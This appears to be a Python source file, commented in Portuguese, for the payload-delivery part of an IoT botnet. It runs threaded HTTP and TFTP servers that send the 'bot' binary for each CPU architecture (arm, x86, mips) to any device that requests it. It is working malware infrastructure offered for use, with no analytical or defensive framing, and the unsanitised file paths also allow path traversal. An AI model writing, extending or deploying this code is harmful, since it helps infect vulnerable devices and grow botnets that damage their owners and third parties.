import os
import threading
import logging
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

log = logging.getLogger(__name__)

BINARY_DIR = "bins"  # Diretório com os binários compilados


class BinaryHandler(BaseHTTPRequestHandler):
    """Serve os binários do bot por arquitetura."""

    def do_GET(self):
        # Path: /<arch>  ex: /arm, /x86, /mips
        arch = self.path.lstrip('/').split('?')[0]
        if not arch:
            self.send_response(404)
            self.end_headers()
            return

        # Procura o binário
        bin_path = os.path.join(BINARY_DIR, arch)

        # Tenta com extensão .bin
        if not os.path.exists(bin_path):
            bin_path = os.path.join(BINARY_DIR, f"{arch}.bin")

        if not os.path.exists(bin_path):
            log.warning(f"Binário não encontrado: {bin_path}")
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not found")
            return

        try:
            with open(bin_path, 'rb') as f:
                data = f.read()

            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Length', str(len(data)))
            self.end_headers()
            self.wfile.write(data)

            log.info(f"Servido {bin_path} ({len(data)} bytes) para {self.client_address}")
        except Exception as e:
            log.error(f"Erro servindo {bin_path}: {e}")
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        log.debug(f"HTTP: {args}")


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """HTTP server com threads para servir binários."""
    allow_reuse_address = True


class TFTPServer:
    """Servidor TFTP simples para IoT."""

    def __init__(self, bind_ip: str = "0.0.0.0", port: int = 69):
        self.bind_ip = bind_ip
        self.port = port
        self._running = False

    def start(self):
        """Inicia servidor TFTP em thread separada."""
        import socket as sock_mod

        def serve():
            sock = sock_mod.socket(sock_mod.AF_INET, sock_mod.SOCK_DGRAM)
            sock.setsockopt(sock_mod.SOL_SOCKET, sock_mod.SO_REUSEADDR, 1)
            sock.bind((self.bind_ip, self.port))
            sock.settimeout(1.0)
            self._running = True

            log.info(f"Servidor TFTP ouvindo em {self.bind_ip}:{self.port}")

            while self._running:
                try:
                    data, addr = sock.recvfrom(1024)
                    self._handle_request(sock, data, addr)
                except sock_mod.timeout:
                    continue
                except Exception as e:
                    log.debug(f"Erro TFTP: {e}")

            sock.close()

        thread = threading.Thread(target=serve, daemon=True, name="tftp-server")
        thread.start()
        return thread

    def _handle_request(self, sock, data, addr):
        """Processa requisição TFTP (RRQ - Read Request)."""
        try:
            # Pacote TFTP: opcode (2 bytes) + filename + 0 + mode + 0
            opcode = int.from_bytes(data[0:2], 'big')

            if opcode != 1:  # RRQ
                return

            # Extrai filename (null-terminated)
            null_pos = data.find(b'\0', 2)
            if null_pos == -1:
                return
            filename = data[2:null_pos].decode('utf-8', errors='replace')

            # Procura binário
            bin_path = os.path.join(BINARY_DIR, filename)
            if not os.path.exists(bin_path):
                bin_path = os.path.join(BINARY_DIR, f"{filename}.bin")

            if not os.path.exists(bin_path):
                log.warning(f"TFTP: binário não encontrado: {filename}")
                # Error packet
                err_pkt = b'\x00\x05' + b'\x00\x01' + b'File not found' + b'\x00'
                sock.sendto(err_pkt, addr)
                return

            with open(bin_path, 'rb') as f:
                file_data = f.read()

            # Envia em blocos de 512 bytes
            block = 1
            offset = 0
            while offset < len(file_data):
                chunk = file_data[offset:offset + 512]
                # DATA packet: opcode(2) + block(2) + data
                pkt = b'\x00\x03' + block.to_bytes(2, 'big') + chunk
                sock.sendto(pkt, addr)

                # Aguarda ACK (simplificado - sem retransmissão)
                try:
                    sock.settimeout(2.0)
                    ack, _ = sock.recvfrom(1024)
                except sock_mod.timeout:
                    log.warning(f"TFTP: timeout ACK bloco {block} para {addr}")
                    break

                block += 1
                offset += 512

            log.info(f"TFTP: enviado {filename} ({len(file_data)} bytes) para {addr}")

        except Exception as e:
            log.error(f"Erro processando TFTP request de {addr}: {e}")

    def stop(self):
        self._running = False


def start_file_servers(
    http_port: int = 8080,
    tftp_port: int = 69,
    bind_ip: str = "0.0.0.0",
) -> tuple:
    """
    Inicia servidores HTTP e TFTP em threads separadas.
    Retorna (http_server, tftp_server).
    """
    # HTTP
    http_server = ThreadedHTTPServer((bind_ip, http_port), BinaryHandler)
    http_thread = threading.Thread(
        target=http_server.serve_forever, daemon=True, name="http-server"
    )
    http_thread.start()
    log.info(f"Servidor HTTP ouvindo em {bind_ip}:{http_port}")

    # TFTP
    tftp_server = TFTPServer(bind_ip, tftp_port)
    tftp_thread = tftp_server.start()
    log.info(f"Servidor TFTP ouvindo em {bind_ip}:{tftp_port}")

    return http_server, tftp_server
